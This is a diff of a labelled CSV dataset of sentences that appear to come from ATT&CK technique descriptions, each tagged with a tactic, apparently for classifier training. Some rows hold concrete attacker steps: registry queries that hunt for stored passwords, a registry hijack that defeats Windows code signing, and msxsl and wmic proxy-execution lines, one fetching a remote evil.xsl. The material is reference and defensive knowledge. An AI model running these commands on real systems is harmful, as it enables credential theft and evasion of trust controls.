-"Staging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):
-
-* Staging web resources necessary to conduct [Drive-by Compromise] when a user browses to a site.
-* Staging web resources for a link target to be used with spearphishing.
-* Uploading malware or tools to a location accessible to a victim network to enable [Ingress Tool Transfer].
+"Staging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):
+
+
+
+* Staging web resources necessary to conduct [Drive-by Compromise] when a user browses to a site.
+
+* Staging web resources for a link target to be used with spearphishing.
+
+* Uploading malware or tools to a location accessible to a victim network to enable [Ingress Tool Transfer].
+
 * Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: [Asymmetric Cryptography] with [Web Protocols]).",RESOURCE_DEVELOPMENT
 "Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing.",RESOURCE_DEVELOPMENT
 "Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise].",RESOURCE_DEVELOPMENT
@@ -3962,28 +4182,43 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "In user mode, Windows Authenticode.",DEFENSE_EVASION
 "Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs).",DEFENSE_EVASION
 "Similar to [Code Signing], adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system.",DEFENSE_EVASION
-"Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: 
-
+"Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: 
+
+
+
 * Modifying the Dll and FuncName Registry values in HKLM\SOFTWARE[\WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID} that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file.",DEFENSE_EVASION
-"By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP .
+"By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP .
+
 * Modifying the Dll and FuncName Registry values in HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID} that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value.",DEFENSE_EVASION
 "By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP.",DEFENSE_EVASION
-"This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.
+"This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.
+
 * Modifying the DLL and Function Registry values in HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID} that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made.",DEFENSE_EVASION
-"Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).
+"Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).
+
 * **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking].",DEFENSE_EVASION
 "Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation.",DEFENSE_EVASION
 "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.",INITIAL_ACCESS
-"Supply chain compromise can take place at any stage of the supply chain including:
-
-* Manipulation of development tools
-* Manipulation of a development environment
-* Manipulation of source code repositories (public or private)
-* Manipulation of source code in open-source dependencies
-* Manipulation of software update/distribution mechanisms
-* Compromised/infected system images (multiple cases of removable media infected at the factory) 
-* Replacement of legitimate software with modified versions
-* Sales of modified/counterfeit products to legitimate distributors
+"Supply chain compromise can take place at any stage of the supply chain including:
+
+
+
+* Manipulation of development tools
+
+* Manipulation of a development environment
+
+* Manipulation of source code repositories (public or private)
+
+* Manipulation of source code in open-source dependencies
+
+* Manipulation of software update/distribution mechanisms
+
+* Compromised/infected system images (multiple cases of removable media infected at the factory) 
+
+* Replacement of legitimate software with modified versions
+
+* Sales of modified/counterfeit products to legitimate distributors
+
 * Shipment interdiction.",INITIAL_ACCESS
 "While supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.",INITIAL_ACCESS
 "Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise.",INITIAL_ACCESS
@@ -4152,8 +4387,10 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "Common subcommands include: launchctl load,launchctl unload, and launchctl start.",EXECUTION
 "Adversaries can use scripts or manually run the commands launchctl load -w ""%s/Library/LaunchAgents/%s"" or /bin/launchctl load to execute [Launch Agent]s or [Launch Daemon]s.",EXECUTION
 "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads.",EXECUTION
-"The Windows service control manager (services.exe) is an interface to manage and manipulate services..
-
+"The Windows service control manager (services.exe) is an interface to manage and manipulate services..
+
+
+
 [PsExec] can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API. and sc.exe can accept remote servers as arguments and may be used to conduct remote execution.",EXECUTION
 "Adversaries may leverage these mechanisms to execute malicious content.",EXECUTION
 "This can be done by either executing a new or modified service.",EXECUTION
@@ -4261,19 +4498,26 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "The Windows Registry stores configuration information that can be used by the system or other programs.",CREDENTIAL_ACCESS
 "Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services.",CREDENTIAL_ACCESS
 "Sometimes these credentials are used for automatic logons.",CREDENTIAL_ACCESS
-"Example commands to find Registry keys related to password information: 
-
-* Local Machine Hive: reg query HKLM /f password /t REG_SZ /s
+"Example commands to find Registry keys related to password information: 
+
+
+
+* Local Machine Hive: reg query HKLM /f password /t REG_SZ /s
+
 * Current User Hive: reg query HKCU /f password /t REG_SZ /s.",CREDENTIAL_ACCESS
 "Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP).",CREDENTIAL_ACCESS
 "GPP are tools that allow administrators to create domain policies with embedded credentials.",CREDENTIAL_ACCESS
 "These policies allow administrators to set local accounts.",CREDENTIAL_ACCESS
 "These group policies are stored in SYSVOL on a domain controller.",CREDENTIAL_ACCESS
 "This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).",CREDENTIAL_ACCESS
-"The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:
-
-* Metasploit’s post exploitation module: post/windows/gather/credentials/gpp
-* Get-GPPPassword
+"The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:
+
+
+
+* Metasploit’s post exploitation module: post/windows/gather/credentials/gpp
+
+* Get-GPPPassword
+
 * gpprefdecrypt.py.",CREDENTIAL_ACCESS
 "On the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: dir /s * .xml.",CREDENTIAL_ACCESS
 "Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials.",CREDENTIAL_ACCESS
@@ -4482,15 +4726,22 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "To support complex operations, the XSL standard includes support for embedded scripting in various languages.",DEFENSE_EVASION
 "Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control.",DEFENSE_EVASION
 "Similar to [Trusted Developer Utilities Proxy Execution], the Microsoft common line transformation utility binary (msxsl.exe).",DEFENSE_EVASION
-"Command-line examples:
-
-* msxsl.exe customers[.]xml script[.]xsl
-* msxsl.exe script[.]xsl script[.]xsl
+"Command-line examples:
+
+
+
+* msxsl.exe customers[.]xml script[.]xsl
+
+* msxsl.exe script[.]xsl script[.]xsl
+
 * msxsl.exe script[.]jpeg script[.]jpeg.",DEFENSE_EVASION
 "Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation] to invoke JScript or VBScript within an XSL file.",DEFENSE_EVASION
-"Command-line examples:
-
-* Local File: wmic process list /FORMAT:evil[.]xsl
+"Command-line examples:
+
+
+
+* Local File: wmic process list /FORMAT:evil[.]xsl
+
 * Remote File: wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”.",DEFENSE_EVASION
 "Adversaries may activate firmware update mode on devices to prevent expected response functions from engaging in reaction to an emergency or process malfunction.",INHIBIT_RESPONSE_FUNCTION
 "For example, devices such as protection relays may have an operation mode designed for firmware installation.",INHIBIT_RESPONSE_FUNCTION
@@ -5204,15 +5455,11 @@ adversaries may also use compromised websites for non-exploitation behavior such
 "There are several known examples of this occurring.",INITIAL_ACCESS
 "Typical drive-by compromise process:
 
-1.",INITIAL_ACCESS
-"A user visits a website that is used to host the adversary controlled content.
-2.",INITIAL_ACCESS
-"Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. 
+1. A user visits a website that is used to host the adversary controlled content.
+2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. 
     * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.
-3.",INITIAL_ACCESS
-"Upon finding a vulnerable version, exploit code is delivered to the browser.
-4.",INITIAL_ACCESS
-"If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.
+3. Upon finding a vulnerable version, exploit code is delivered to the browser.
+4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.
     * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.",INITIAL_ACCESS
 "Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations.",COMMAND_AND_CONTROL
 "This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications.",COMMAND_AND_CONTROL
